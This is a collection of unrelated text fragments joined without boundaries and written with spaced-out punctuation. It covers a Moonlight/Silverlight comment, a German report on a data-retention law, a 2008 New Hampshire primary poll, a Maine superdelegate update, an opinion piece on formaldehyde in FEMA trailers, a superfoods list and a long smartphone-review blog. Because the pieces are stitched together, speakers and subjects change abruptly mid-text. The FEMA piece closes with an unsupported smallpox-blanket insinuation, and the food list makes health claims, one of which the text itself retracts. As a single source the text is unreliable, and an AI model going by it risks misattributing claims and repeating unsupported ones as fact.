What if the vendors do not care about my opinion ?
What we got here is a case of an underserved market .
This is why competition is good .
Now Microsoft is providing something that none of the existing web vendors had provided and some of us want .
I liked it so much , that I did not hesitate for a second when a journalist asked me whether we would do an OSS implementation of it .
" Can I quote you on that ? " he said during the coffee break at Mix " Yes , you can " .
You talk about Microsoft 's control over Silverlight .
What prevents anyone from taking the Moonlight source code , embracing it , extending it , innovate with it , prototype with it , and enter the same cycle that Linux , or web browsers have entered ?
Or someone turning it into a standard ?
Nothing .
The only thing preventing it is lack of imagination .

Der Bundespräsident habe das Gesetz nach intensiver Prüfung ausgefertigt .
" Es gab keine durchgreifenden verfassungsrechtlichen Bedenken , die ihn an der Ausfertigung gehindert hätten . "
Damit kann das Gesetz , das der Bundesrat Ende November trotz anhaltender Proteste gebilligt hatte , zum 1 . Januar 2008 in Kraft treten .
Danach werden Telefon - und Internetverbindungsdaten künftig ein halbes Jahr lang gespeichert und neue Regeln für die Telefonüberwachung eingeführt .
Auch Telefonate von Anwälten , Ärzten und Journalisten dürfen unter bestimmten Bedingungen abgehört werden .
Gegen das Gesetz sind Verfassungsbeschwerden – darunter von dem FDP - Politiker Burkhard Hirsch – angekündigt .

MANCHESTER , New Hampshire ( Reuters ) - Democrat Barack Obama rocketed to a 10 - point lead over Hillary Clinton in New Hampshire one day before their showdown in the state ’s presidential primary , according to a Reuters / C- SPAN / Zogby poll released on Monday .
Republican Sen. John McCain of Arizona also began to pull away from rival Mitt Romney , opening a five - point lead on the Massachusetts governor as what had been tight races in both parties began to open up .
This is the first of the rolling New Hampshire polls taken entirely after last week ’s caucuses in Iowa , where Obama and Republican Mike Huckabee scored breakthrough wins that left Clinton and Romney reeling .
Obama , an Illinois senator bidding to make history as the first black U.S. president , gained 11 points on Clinton to lead the one - time Democratic front - runner 39 percent to 29 percent .
Former North Carolina Sen. John Edwards was third with 19 percent .
“ This is a breathtaking movement in Obama ’s direction , ” said pollster John Zogby .
“ It ’s a surge for Obama and movement away from Clinton . ”
He said the rush toward Obama was even more pronounced in the one day of polling after Saturday ’s Democratic debate in Manchester , where Clinton went on the attack against Obama and drew a rebuke from Edwards .
“ It ’s almost Iowa redux , ” Zogby said .
“ In the closing days in Iowa we saw Clinton losing her strong support among women , liberals and Democrats , and it ’s happening again . ”
He said Obama had a big and growing lead among independents and held the edge among young voters , moderates and union members .
The rolling poll of 844 likely Democratic voters and 834 likely Republican voters was taken Friday through Sunday .
It has a margin of error of 3.4 percentage points .
NEXT BATTLEGROUND
New Hampshire ’s primary on Tuesday is the next battleground in the state - by - state process of choosing Republican and Democratic candidates for November ’s election to replace President George W. Bush .
The pressure is on Clinton and Romney to revive their campaigns after disappointing showings in Iowa , and a second consecutive loss for either could doom their comebacks .
Clinton , the New York senator and former first lady , finished third in Iowa .
Romney , who at one time led polls in Iowa and New Hampshire , finished second .

McCain sailed past Romney in the new poll to open a five - point lead at 34 percent to 29 percent .
Huckabee , a Baptist minister and former Arkansas governor , dropped back slightly to 10 percent , barely holding third place over former New York Mayor Rudy Giuliani at 9 percent .
“ It was a big day for McCain , ” Zogby said .
“ He maintains a very big lead among independents , but his problem is that he wo n’t draw as many independents as he did in 2000 . ”
McCain won the state ’s primary that year with help from a surge of independent support , but eventually lost the Republican nomination to Bush .

About 6 percent in each party remain undecided , according to the New Hampshire poll .
In the Democratic race , former New Mexico Gov. Bill Richardson was in fourth place at 6 percent , ahead of Ohio Rep. Dennis Kucinich at 2 percent .
In the Republican race , Texas Rep. Ron Paul was at 6 percent .
Former Tennessee Sen. Fred Thompson was at 3 percent and California Rep. Duncan Hunter was at 1 percent .
The rolling tracking poll will continue one more day until New Hampshire ’s vote on Tuesday .
In a rolling poll , the most recent day ’s results are added while the oldest day ’s results are dropped in order to track changing momentum .

Update :
On Thursday , Knutson announced that he will support the candidate who wins the majority of the vote in Maine .
" For all intents and purposes , Maine now has 25 delegates up for grabs since I will be embracing the candidate who wins Maine 's caucuses , " said Knutson .
As a Super - Delegate , Knutson will represent this winning candidate at the Democratic National Convention .
A few things to take into consideration with this list .
We 're showing results only by state and not breaking it down by congressional district or cities .
Also , it 's extremely important to remember that superdelegates ( and delegates alike ) can change their vote .
David Sirota over at OpenLeft writes about Maine 's DNC Chairman John Knutson who has pledged to endorse whoever wins the caucus on Sunday .
Deja vue , Indeed : The Evolving Story of FEMA ’s Toxic Trailers by Stephanie M. Schwartz , Freelance Writer - Member , Native American Journalists Association ( NAJA ) © July 16 , 2007 Firestone , Colorado Stephanie M. Schwartz
In June of 2007 , Senator Tim Johnson , FEMA , Congress , and the BIA arranged for 2,000 FEMA trailers to be made available to the Native American reservations in dire need of housing .
These trailers are part of the 8,000 + excess , unused FEMA trailers constructed for the victims of the 2005 Hurricane Katrina .
Exactly which American Indian reservations and how many units each reservation will get remains yet to be decided .
The tribes will be required to pay transportation costs as well as the costs to prepare the lots , set the trailers up , and to winterize them .
However , clearly this appeared to be a significant help towards the critical need of about 90,000 American Indian families in need of adequate housing ( as detailed in a 2003 study by the U.S. Commission on Civil Rights ) .
According to public statements , Senator Johnson specifically envisioned many of these trailers going to the Pine Ridge Reservation in South Dakota , a place whose poverty - stricken conditions are likened to third world countries .
The Senator and the BIA have been working closely with John Steele , Paul Iron Cloud , and the Tribal Council from Pine Ridge to make it all happen .
It seemed a surprisingly ideal solution , one which many people applauded at first as a huge humanitarian and logical move by the Federal Government .
Ideal , that is , until one starts to investigate the history of these mobile homes and learns of an astonishing toxicity issue with the vast majority of the units .
Said to be fully - furnished , three bedroom units , these trailers were built during a construction frenzy created by FEMA 's unprepared but immediate need to house Hurricane Katrina survivors .
A report from the Sun Herald News in Mississippi in May of 2006 details the picture of this manufacturing frenzy .... untrained workers , a dearth of suitable materials , using materials possibly made outside the U.S. which contained higher levels of chemicals than normally allowed , and low quality control on hastily - created assembly lines .
Chemicals … therein lies the problem .
The Government 's public announcements about these trailers fail to mention the history of toxic contamination fr om formaldehyde which has been proven to exist in the FEMA trailers and mobile homes constructed for the victims of Katrina .
Formaldehyde is a chemical which emits gasses which the EPA considers to be highly toxic and carcinogenic ( known to cause lung , nose , and throat cancer ) but which is not regulated for trailer manufacturing in this country .
According to the U.S. Department of Health and Human Services , exposure to formaldehyde toxins can create irritated eyes , breathing problems , headaches , asthma attacks , coughing , congestive heart disease , nausea , depression , memory - impairment , skin rashes , respiratory problems and even can lead to cancer .
To compound the problem , high temperatures or high humidity increase the toxin levels .
Worse , for people who already are compromised with respiratory health issues , and for infants , children , nursing mothers , and elders , exposure can prove disastrous and even more deadly .
Formaldehyde is used in cheap building materials like particle board , plywood , curtains , molded plastics , counter tops , glue , carpet , insulation , and wallpaper .
While normal trailers and mobile homes also contain these toxins , the FEMA trailers and mobile homes , hurriedly built as bare - bones cheap models , seem to contain significantly higher concentrations .
In 2006 , the Sierra Club tested FEMA trailers in Louisiana , Mississippi , and Alabama and found 83 - 94 % of them to contain formaldehyde levels far above EPA and OSHA recommended workplace limits of 0.10 parts per million .
Other testing has shown comparable results .
Varying reports state that the gas levels emitted by the formaldehyde in the contaminated trailers ranged from 3 to 1,000 times the acceptable EPA limits .
Originally , FEMA 's response to hundreds of complaints from Katrina victims was that the toxic vapors go away with adequate ventilation after about six months .
However , continued testing has proven that not to be the case .
Additionally , according to a report given by journalist Dan Rather on HD - TV , information has come to light that FEMA was informed of the high toxicity by OSHA ( Occupational Safety and Health Administration ) just two months after Katrina hit , in October 2005 , but did nothing .
Testing to ensure employee safety , OSHA found new units in four county FEMA staging areas to have toxicity levels 20 times above government standards just in the air outside the trailers .
Dan Rather further related his interview with a former FEMA employee who clearly indicated that not only was FEMA aware of the toxic problems but chose to ignore them .
Moreover , the employee stated that FEMA advised their employees to remain silent about the test results .
In March of 2007 , the Washington Post News reported FEMA 's woes in trying to sell their excess trailers and mobile homes .
Selling the units at 40 cents on the dollar seemed like simple poor financial management on the part of FEMA in this report .
However , in light of the contamination issues , it may have turned out to be the best financial move FEMA could have made .
In May , 2007 , both ABC News and CBS News reported that Louisiana Dem . Senator Mary Landrieu and Louisiana Rep. Congressman Bobby Jindal have each independently called for hearings to address the FEMA trailer toxicity issues and FEMA 's poor response as well as to what it knew , how much it knew , and when .
In June , 2007 , the Louisiana Advocate News reported that a class - action lawsuit had been filed in Baton Rouge , Louisiana Federal Court which claims that " hundreds of thousands " of people in Louisiana , Mississippi , and Alabama may have been exposed to dangerously high concentrations of carcinogenic formaldehyde fumes with no recourse or viable solution provided by FEMA .
According to a report in the Washington Post on July 13 , 2007 , Desiree Collins of Louisiana filed the original lawsuit regarding the contamination of the FEMA trailers .
She allowed her lawsuit to become a class - action lawsuit for all Katrina survivors who are victims of the toxic exposure .
On July 2 , 2007 , the 47 year old wife and mother died of lung cancer which was diagnosed only a week before she died .
Her husband and children will continue the court case .
Obviously , it seems tragic enough that well over 75 - 85,000 families , victims of Hurricane Katrina , still have to remain trapped into living in their FEMA units two years after the fact , a home most likely contaminated and dangerous .
That , in itself , defies anyone 's definition of humanitarian aid .
Yet since June of 2007 , with South Dakota Dem .
Senator Tim Johnson leading Congress into approval , tribal councils are working hand in hand with the Federal BIA ( Bureau of Indian Affairs ) to bring 2,000 of these very same trailers to the reservations of South Dakota as well as to other reservations .
Again , all under the guise of humanitarian aid .
Deja vue , indeed .
We have been here before .
The seeming - correlation of the distribution of toxic trailers to the reservations in 2007 and the government dispersing smallpox - infested blankets to the reservations in the 1800s is not so far - fetched at all .
It just leaves one wondering …..

The hit book The 150 Healthiest Foods on Earth by Jonny Bowden is a great resource , because it highlights the health benefits of many everyday foods .
This is not a book that sends you off in search of unusual and hard to find stuff — it lists basic , readily available items .
Eating healthy is a challenge for busy people , so here ’s a list of 12 “ superfoods ” to keep in mind when preparing meals and snacks .
Beans :
They ’re small in size , but big on fiber and iron .
Darker - colored beans , such as black and kidney , have an even higher concentration of healthy stuff .
Apricots : The oft - forgotten apricot is great source of Vitamin A and other nutrients .
Dried apricots are even more nutritious , and portable , than fresh ones .
Prunes — hey , do n’t laugh — are also terrific .
Berries : Blueberries in particular , but also cranberries , raspberries and blackberries are highly recommended for healthy aging .
Said to help maintain short - term memory , blueberries contain high levels of antioxidants .
Broccoli :
It ’s not hard to eat broccoli if you sauté it in a bit of olive oil and garlic .
Deep - green vegetables like collard greens , kale and asparagus have abundant nutrients .
Bok choy ( Chinese cabbage ) is also packed with nutrients that are said to guard against certain cancers .
Cacao : Did n’t expect to see chocolate on a super food list , right ?
Well , buying organic chocolate ( found in most health food stores ) with high levels of cacao can do a body good .
It may not be the tastiest thing to eat straight , but mix a bit of 100 per cent organic cacao powder into a morning smoothie or coffee , or buy chocolate bars that are at least 75 per cent cacao .
Note : Snickers bars are not a healthy substitute .
Peanut Butter :
The food that kids love is , in fact , healthy for you .
Nuts are packed with omega - 3 fatty acids , which can help fight heart disease .
Almonds , in particular , are known for lowering cholesterol .
Turkey : Thanksgiving and Christmas are long gone , but it ’s always a good time to make lean , protein - rich turkey .
You can cook a small breast with a side of cranberries , or substitute ground turkey in recipes that call for ground beef .
Unfortunately , turkey lunch meat does n’t make the cut , because it ’s typically high in sodium .
Cinnamon : Believe it or not , this spice is considered to be one of the healthiest foods in the world .
And , no , it does n’t count if it ’s glued to the top of a sticky bun !
Simply dust it on your oatmeal , your morning coffee , or even on a piece of fruit .
Studies suggest that it can lower cholesterol and help control blood sugar ( diabetics take note ! ) .
– Update : Kim and Gary ( see comments below ) have brought to our attention that the American Diabetes Association posted a study just last month saying that cinnamon DOES NOT have any effect on your blood sugar levels .
Thanks , Kim and Gary !
Pomegranate juice :
This antioxidant - rich juice has been shown to help fight heart disease and lower cholesterol .
Drink a small cup of pom juice daily , diluted with water if you find the taste too strong .
You can also buy blends that contain apple or blueberry juice .
Yogurt : Smoothie lovers , take a bow !
You ’re ahead of the game if you ’re eating non -fat yogurt , because it ’s good for intestinal health .
Mix the plain stuff with some of the items on this list , including nuts , cinnamon or berries and you ’re doubling up on healthy ingredients .
Oats :
Whole - grain goodies , such as oat bran breakfast cereal ( like Cheerios ) , oatmeal and whole grain breads are on the list because they help lower your cholesterol and increase fiber intake .
Avocado :
Go ahead and whip up some avocado salsa , a great side dish .
Guacamole is also good for you .
Avocados are high - calorie , so you do n’t want to go crazy eating them , but they are said to improve blood flow , which increases brain activity .
All the big guns want an iPhone killer .
Even I , mad for all things Apple as I am , want an iPhone killer .
I want smart digital devices to be as good as mankind ’s ingenuity can make them .
I want us eternally to strive to improve and surprise .
Bring on the iPhone killers .
Bring them on .
YOU might , somewhere along the way , have picked up the impression that I am a passionate Mac advocate : I bought my first 128 K machine in 1984 , the second Macintosh to be sold in the UK – at least so I ’ve always maintained and believed ( the first went to the still desperately missed Douglas Adams ) and I have never had fewer than ten working Macs on the go since the late 80s .
It is true that I value both the platform and the hardware , that I admire the imagination , flair , elegance , quality and pioneering spirit of the Apple corporation .
All quite true .
HOWEVER ……..
I have , over the past twenty years been passionately addicted to all manner of digital devices , Mac - friendly or not ; I have gorged myself on electronic gismos , computer accessories , toys , gadgets and what - have - yous of all descriptions , but most especially what are now known as SmartPhones .
PDAs , Wireless PIMs , call them what you will .
My motto is :
I have never seen a SmartPhone I have n’t bought
After all , the Mac itself was founded on a notional smart device , the Dynabook , fruit of the many brains of the legendary Xerox Palo Alto Research Centre ( PARC ) .
The Dynabook concept gave us the WIMP user interface , ( Windows , Icons , Mice , Pull down menus ) and thence the Apple Lisa and its successor , the Macintosh .
The Dynabook was a posited form , a notional device that would deliver information to its user with the greatest ease and intuitive functionality .
As a result of this mission statement , the command code line found in all standard computing of the time was made to yield to a Graphical User Interface ( GUI ) .
Apple took up the call ( poached some PARC staff ) and produced the Mac OS ; IBM and latterly MS took years and years to get the message .
But that is how the GUI was born , out of a quest for a better relationship between man and machine , individual and digital device .
Whether you talked into it , stroked it , operated a stylus or pointing device the essence of the Dynabook was not that it might actually be built ( technology in the 1970s could n’t begin to provide such an object , nor indeed can it now ) but to predicate a useful Platonic Ideal .
The Device .
The Chosen One. One Electronic Object To Rule Them All .
Like any Platonic ideal , it cannot ever exist : to postulate its existence is enough to set clever people on the right path to creating remarkable technologies that contribute to the digital world and our interactions with it .
It is in this sense the computer designer ’s Holy Grail – the adventures , romances and interior quests along the way are what counts – the Grail itself will always be out of reach .
We are getting closer however .
A single handheld device that can summon up a vast repository of human knowledge , communicate with anyone , tell you to within five meters where on the planet you are , take and show photographs , record and play music , send and receive vox or data communications ; a device you can speak into and that can speak to you , a device that you can manipulate without fiddly controls or technical knowledge , a juke - box , a cinema , a radio , a library , a community centre , a parish pump , the school gates and the city university .
Not considered to be computers , although computers is most assuredly what they are , these devices are for the moment designated SmartPhones , and it is on them that I wish to discourse and expatiate in an entirely disinterested ( if you think I mean uninterested , think again and look up the difference ) and mostly non-technical way .
Of course , this essay , if it can be described as such , is a response to the rise and rise of the SmartPhone , as most publicly trumpeted a few weeks ago with the arrival of Apple ’s iPhone .
I am not here to laud or review that device however , it has had enough publicity and I really want you to believe that , Apple addict as I am , my eyes have always been open to the virtues of anything good , exciting , functional , elegant , pleasing to use .
In fact the real precipitating reason for writing this is the fact that within three weeks I have bought / been sent , aside from my iPhone ( which , yes , I dearly love ) , three soi-disant ‘iPhone killers ’ – the HTC Touch , the Nokia E90 and the Sony Ericsson P1i .
While I do n’t intend fully to review , road - test or benchmark each device ( as if I could , anyway ) , I do want to share my thoughts about where these devices appear to be going .
( I ’m not even going to mention outside these parentheses the LG Prada phone , that ’s an iPhone beater in the same way Tim Henman is a Federer beater ) .
One more thing : I ’m writing this in short bursts of time between filming in the middle of rural Norfolk , where GPRS , let alone EDGE , is a rare , momentary treat .
This means I have n’t been able to check up on all my facts all the time : sometimes a tethered modem DUN connection allows me to jack into the matrix , but mostly I ’m in a field fondly fingering a phone .
There will be errors here .
Forgive me .
This is a blog , not an article and I have n’t time to get home in the evening and do much more than check the hyperlinks , such as they almost randomly are .
You are n’t paying for it .
I ’m human .
So , let ’s slip in a SIM , power up and see what happens .
My obsession with SmartPhones began many , many years ago .
Certainly well before such devices existed in the real world .
From the first Sharp contact - and - calendar “ electronic organisers ” , through the early Psions , the sadly missed AgendA ( see above : no QWERTY there , more a kind of weird courtroom stenographer ’s chord - based input pad : never have I been able to write faster than with that splendid object – I had another device using the same input system called , I think , Qinky , which connected to the Centronix port of a BBC Micro ) , to the opening salvo of Palm Pilots , Apple ’s Newton and the arrival of Handspring .
If they existed I had to have them .
Had to .
Some could be used with a phone : they might generate dial - tones for example , or somehow , like the later Psions , come with the optional extra of an infrared modem that could shake hands with a Nokia mobile phone and put one on the path to something approaching what today we might call a SmartPhone experience .
Those infrared modem scripts still lurk in the system preference and plugin files of even the most up - to - the - minute computer , like a Kodak Instamatic in the back of a drawer .
Obsolete , but too charming to throw away .
And you never know – one day you might just need them …
There is always , in the way of these things , a model that ’s just right .
The Psion 3 , the Treo 180 — such close - to - perfect devices are always overtaken by newcomers that arrive shimmering with newer technology and higher functionality but do n’t do what they do as satisfyingly , as perfectly , as their predecessors .
The brilliant Psion 3 was superseded by the inferior 5 series and then the not - quite - up - there Revo ( which I helped launch , I have to confess : maybe my fondness for the Series 3 is felt for the Revo by these people , they certainly seem very keen ) , and pretty soon it was goodbye Psion plc .
Another pioneering British company founds a whole niche and then bites the dust .
But Psion , British , innovative and doomed certainly , did leave the world a lasting legacy aside from the new marketplace itself – an operating system that still does its stuff in over a hundred million phones .
Originally called EPOC , its ARM processor power ( it addressed more bits in its day than most people ’s PCs ) and simple elegance has evolved into the complex organism known as Symbian , like Bluetooth a largely Scandiwegian / Japanese co-owned entity .
In the years that followed the demise of Psion and the to-ing and fro-ing of Palm , ( the US early leaders in the field ) , a number of things happened .
Cellular telephony went from GSM to GPRS to EDGE to WCDMA , HSDPA , UMTS or whatever we like to call 3G these days .
Microsoft introduced a cut - down Windows for PDA / SmartPhones , one with stylus operated touch - screen , one without , the RIM Blackberry came on the scene with its business oriented push email and the whole market went from niche to general .
Bandwidth and memory ceased almost to be an issue and those of us who had once spent hundreds on a 256MB Compact Flash looked in amazement at the cheap 2 Gb thumbnails hanging in blister - packs from any old airport Dixon’s .
Palm split itself in two , reluctantly ( IMHO ) retaining the Palm OS in the shape of the excellent 650 and the wildly disappointing 680 and allying itself big - time - stylie with Windows Mobile , all of which devices ( again IMHO ) more or less stink .
Since then , in one of the most astonishing public suicide attempts in the history of this industry , Palm have produced a item that EVEN I DO NOT WANT , the Foleo .
If it ’s got a chip in it , and a keyboard , and WiFi and a screen and I have n’t sent off for one , then by God you ’d better believe it ’s in trouble .
Though mind you , knowing me , I probably would have bought one in the end .
Palm , however , have come to their senses , swallowed their pride ( and $ 10 million ) and ditched the dreadful thing , as their CEO ’s blog recently revealed .
Maybe Palm have finally realised that what those of us who have used , abused , loved and lived the original Treos yearn for is a fast 3G , WiFi and FULLY PALM OS Treo 800 or whatever they ’d want to call it .
The newish 755 p would be an acceptable stopgap – high speed , better battery life , keyboard response and imagination behind it than the pitiful 680 – if only the damned thing were n’t tied to the CDMA EvDO protocol , which is useless in Europe .
Give us our Treo 800 p , GPRS / 3G phone and we will love you for ever .
For the Palm OS , ageing as it is , still has something of an edge over its competitors .
Superb address - book design and functionality ( still the quickest way , from the draw , to find a name out of 2,000 and call it , text it or email it on any device I ’ve ever seen , is on a Palm .
Blackberry comes a pretty close second in my unscientific tests ) , next there is its sheer speed as a GUI .
Never a hint of a screen redrawing , never any lag ( not counting the 680 ’s irritating address book line drop – if you ’ve got one you ’ll know what I mean , if not , it ’s too complicated and dull to explain ) , this is a stable , lightning - fast OS ( as unlike Windows for Mobile or Windows for SmartPhones as you can imagine , therefore ) .
Add to this the inestimable pleasure and benefit of SMS threading ( it simply STAGGERS me that no one until now , with the arrival of the iPhone , aside from Palm , offers this , to my mind , essential feature , something that ’s been available on the Treo since the get - go ) , a good Today screen , fabulous speed - dialing options ( including one button URL and texting – great for AQA , for example ) and related calendar functions , simple flexible bluetoothing ( though it ’s a bugger to get one to work with a Tom Tom or similar in - car B’tooth device ) , all the media requirements , a really fast keyboard which ( surprisingly , for it looks fiddly ) allows about the same text entry speed as a Blackberry 8800 , superb syncing with either PC or Mac , neither favoured over the other , and you ’ve got the ideal package .
It ’s been around a long time , a very long time for the digital world , testament to the imagination , foresight and brilliance of its first engineers and designers .
But that also means that the old girl is showing her age .
I ’ve been syncing , disabling conduits , deleting unwanted duplicates and generally faffing about with Palm devices for well over a decade and I have a very , very soft spot for them .
How dumb of them therefore to reduce the quality with the 680 .
Worse battery life , no longer the inestimable pleasure of an exterior SIM slot , irritating reassignment of keys , slow boot up time , absence of reset button – etc etc etc .
So we ’ll leave Palm , hoping that they wo n’t be squeezed out by the big boys and by their own suicidal tendencies .
They have no iPhone killers at market as I write .
We ’ll believe in the idea of a Treo 800 when it comes .
If they upgrade the OS , fully commit to it and ditch nonsenses like the Foleo I see a real future for Palm yet .
Admittedly it has barely penetrated the European market , but worldwide and in the USA especially it has a real presence and a strong and committed user base .
HTC and the No - Win Mob
Let ’s look at the WinMob now .
The HTC Touch is called ( by idiots ) an iPhone killer because it comes without a keyboard and makes a brief and rather feeble nod towards the idea of a strokeably operated touch - screen offering a silly cube transformation effect with big buttons .
Oh , and the Touch is WinMob 6 rather than 5 ( you wo n’t notice the difference – a quite cool coloured line fribble in the agenda which shows you which days of the week are busy is the best addition , otherwise it ’s virtually indistinguishable from WM5 ) .
In theory you can remove the SIM card without dislodging the battery , but in practice springing it out causes a reboot anyway .
But that ’s it , 2 MP camera , no to 3G , WiFi / WLAN capable .
The thundering nuisance of the Touch is that it encourages one to use the side of one ’s thumb , the fat of one ’s finger , one ’s nose etc etc , all of which work with the big buttons – but when it comes to text entry and innumerable other choices , sure enough , the old thumbnail has to be ready to go behind and hoik out the stylus .
It is not badly designed at all , most people who have seen me playing with it are impressed and want one , which is some kind of a test , I suppose .
The front page weather app is pleasing ( owing a lot as it does to Apple ’s bundled Dashboard widget , see the pic above ) .
Otherwise the Touch is nothing like as good as the HTC 3600 , which is a true 3G , inbuilt GPS , elegant , keyboardless device of more power , flexibility and purpose .
Far and away the best WinMob device I ’ve seen , it ’s good to look at , reliable and genuinely usable .
Input , as with the Touch and all WinMob stylus devices , is via a choice of handwriting recognition ( including the old Palm Graffiti rebadged as Block Recognizer , which competes with a virtual keyboard and two other systems ) .
HTC are bringing out a 6300 ( aimed at “ enterprise solutions , ” yawn , yawn , yawn , yawn , yawn ) which looks identical to the O2 and Orange badged versions of these things , a Windows button , an OK button etc. , dull silvery finish , the usual bad design that “ corporates ” always seem prepared to put up with , as if they ’re embarrassed and ashamed by any stylishness which might draw attention to them .
The SmartPhone equivalent of living in a block of modern flats .
Most mod cons , but no style , delight or emotional attachment to be had .
Windows for Mobiles is certainly better than Windows for PCs or , God help us all , Vista , but it is still an insulting offering .
The feeling , as with all things Microsoft , is that all design features and functions are there to suit MS rather than to delight , enthuse and compel the user .
Compromise , short - cuts , inconveniences , vestigial residues – no one responsible is likely to pat themselves on the back for the design or the s’ware engineering , any more than the architect or project manager of a 60s council flat is likely to point it out with pride as he rides by with his grandchildren .
You ’re only on this planet once – do something extraordinary , imaginative and inspiring .
That ’s the difference , ultimately .
Those behind Palm OS and the Psion can justifiably be proud of what they did , what they created .
WinMob just muscled in on a market they never spotted and they did it in a clumsy , bullying , ugly manner , exactly as they had with Windows before , and exactly as IBM had with the PC itself a decade earlier .
Break free , all you corporate software engineers and designers : the excuse that you are under the rule of dullards , greedy share - price number crunchers and visually and ergonomically illiterate yahoos is not good enough .
Persuade them .
Otherwise we all get a digital environment that ’s a vile as a 60s housing estate .
Syncing Issues – A Sidebar On WinMob devices the syncing software , an almost useless PC app called ActiveSync , allows no control over the syncing process and therefore gets any power user into trouble with duplicates , the bane of our lives .
Much better , if you ’ve a Mac , to invest in Mark Space ’s Missing Sync for Windows Mobile , which has just had a round of upgrades that cope well with the HTC Touch and other WinMob 6 devices .
Those of us who fiddle around with Plaxo , Google Calendars , and other server - side apps and utilities really need to know what we ’re doing or we can get into the most awful pickle with our address books and calendars .
Essential to have the ability to guarantee priorities and overwrites .
Any Mac user who plays as much as I do has been forced to try every variation of Bootcamp , Virtual Machines and actual real , live PCs as a means of syncing and controlling their various SmartPhones .
My conclusion is that as far as WinMob devices are concerned it ’s better to stay in Mac OS and look for iSync plug-ins and third party apps .
Nokia and Sony Ericsson have reasonable PC Suite software that justifies a visit to a PC or via Bootcamp or Parallels for Mac , but with WinMob , stay away from the truly insulting feebleness of ActiveSync .
I have spoken .
Sony Ericsson
The very nice people at Symbian ( the OS that arose from the ashes of Psion ’s EPOC , remember ) , hearing through a mutual friend of my passion for all things mobilic and phonular , sent me the new Sony Ericsson P1i , which is only just out in the world .
It ’s pictured above there in the middle , between its parents .
I ’ve owned and used two P990i models ( that ’s the daddy on the left ) as well its forerunner the P900 , the 910 and one M600i ( that ’s the mummy on the right ) .
What the family have in common is their commitment to one of Symbian ’s two major platforms .
I mentioned that Symbian as an OS had evolved since its EPOC days – the two chief sub-species are called UIQ and S60 ( there ’s another called MOAP which need n’t worry us , as it ’s only used in Japan so far as I can tell .
As a matter of fact , it ’s my washpot ) … if you try and download a Symbian application , WorldMate for example , you ’ll find it comes in those two Symbian flavours ( as well as in Java and Palm and WinMob of course ) UIQ stands for something like User Interface Quartz and S60 for System 60 .
Go figure , as they say in America .
Well , Sony Ericsson in the “ i ” series of SmartPhones as shown above has gone big time for UIQ .
Nokia , as we shall see , has thrown its might behind S60 .
The 990i , when it came out to replace the 900 , boasted 3G , a 2 MP camera , WiFi , memory stick , bluetooth and a new rather impressive all singing , all dancing UIQ environment .
But it was also big .
Almost 1980s sized , or so it seemed next to the Slim Jims that were becoming popular amongst standard mobile phone users then ( two and half years ago , a lifetime in this world ) , with a not very satisfactory flip phonepad which swung down to reveal a hideously unusable QWERTY keyboard .
Full function was n’t possible with the flip pad up ( although I liked its four - way navigation buttons , which complemented the left side thumb - wheel superbly ) , yet with the flip down in full - function mode you were staring at the waste of space offered by the awful keyboard and depending wholly upon the stylus and ( admittedly impressive ) handwriting recognition .
Battery life was a joke ( a major problem with UIQ ) and worse still stability was a huge issue .
This thing crashed more times than an Italian dodgem car ; actually it did n’t even have the dramatic wit to crash , it just hung and wasted your time .
Plus it had an internet / access point / wifi set - up system that made you want to weep , stamp your feet and disembowel the team responsible .
But then along came the M600i ( on the right above , also available in White , as used by Bond in Casino Royale ) .
More elegant , pleasingly turquoise highlights , same UIQ GUI but this time a QWERTY keyboard in which each key does office for two letters ( not unlike the slightly later Blackberry “ Pearl ” 8100 , but with nothing like as elegant and useful an implementation ) .
3G , but without camera , so no videocalling , and no WiFi .
Result ?
a slightly handier , but ultimately less function - rich object than its big progenitor , the 990i .
The rumour flew around that something new was in the works combining all the power of Daddy and all the elegance of Mummy .
We could n’t wait .
This will be the Big One , we thought , the justification and apotheosis of UIQ .
Mine arrived at the beginning of this week .
What a crushing , lowering , fury - inducing disappointment .
Just how dumb are the software engineers , designers and marketeers at Sony E ?
Believe me , I so wanted this to be good .
Instead , it is nothing more than a gesture , an under - considered , badly implemented nod at the market .
It ’s an M600 i running Symbian v 9.1 and UIQ v 3.0 equipped with a camera and WiFi ..
That ’s it .
No attempt has been made to alter the UI or the OS .
The result : the clumsiest , most asinine method of internet connection ever devised ( yes it has a wizard to download your network ’s APN etc. , but that ’s not enough ) comes unaltered , the bugginess and the slowness too have all have been inherited , and the short battery life .
Did they really think slinging on a 3.2MP camera and WiFi would make a desirable device , let alone an iPhone killer ?
I could issue forth quires of intemperate fury on the subject of how bad internet account configuration is on the UIQ Sony Ericssons .
It ’s utterly pointless .
Is there not one person at either Sony E or Symbian who themselves uses the phone and says “ hang on , we could do this better ” ?
That ’s all it takes .
Just one person to point at the Emperor and shout “ nudie ! ”
That ’s why Apple is Apple , they have people there ( and of course it comes from the top ) who say – “ woah , not good enough , not cool enough , not simple enough , not fun enough , not sexy enough , not clever enough , not useful enough ” .
The P1i is what happens when “ oh , that ’ll do ” becomes the corporate motto .
UIQ promised something , the actual GUI is reasonable , in fact quite delightful , but it needed refinement , it needed acceleration and it needed flair .
Instead we ’ve got a very , very slow device that eats power , is difficult to use in varying environments and frequently hangs and crashes .
In a word unusable .
And I can just hear them hiding behind the excuse of “ price ” and “ sectors of the market ” and other bullshit .
What , Apple ’s a bigger company than Sony ?
Got more muscle ?
What muscle it has got , it got from daring to be better .
That was once true of Sony too .
Of Ericsson I cannot speak …
Do n’t these people get it ?
A new sidebar coming on …

Design matters
By design here , I mean GUI and OS as much as outer case design .
Let ’s go back to houses .
The sixties taught us , surely , that architectural design , commercial and domestic , is not an extra .
The office you work in every day , the house you live in every day , they are more than the sum of their functions .
We know that sick building syndrome is real , and we know what an insult to the human spirit were some of the monstrosities constructed in past decades .
An office with strip lighting , drab carpets , vile partitions and dull furniture and fittings is unacceptable these days , as much perhaps because of the poor productivity it engenders as the assault on dignity it represents .
Well , computers and SmartPhones are no less environments : to say “ well my WinMob device does all that your iPhone can do ” is like saying my Barratt home has got the same number of bedrooms as your Georgian watermill , it ’s got a kitchen too , and a bathroom . ” …
I accept that price is an issue here ; if budget is a consideration then you ’ll have to forgive me , I ’m writing from the privileged position of being able to indulge my taste for these objects .
But who can deny that design really matters ?
Or that good design need not be more expensive ?
We spend our lives inside the virtual environment of digital platforms – why should a faceless , graceless , styleless nerd or a greedy hog of a corporate twat deny us simplicity , beauty , grace , fun , sexiness , delight , imagination and creative energy in our digital lives ?
And why should Apple be the only company that sees that ?
Why do n’t the other bastards GET IT ??
My disappointment in the P1i turned to anger as the real structural flaws emerged .
The awful laggardly horrors of the mail inboxes with their perpetual “ Busy ” box flashing away .
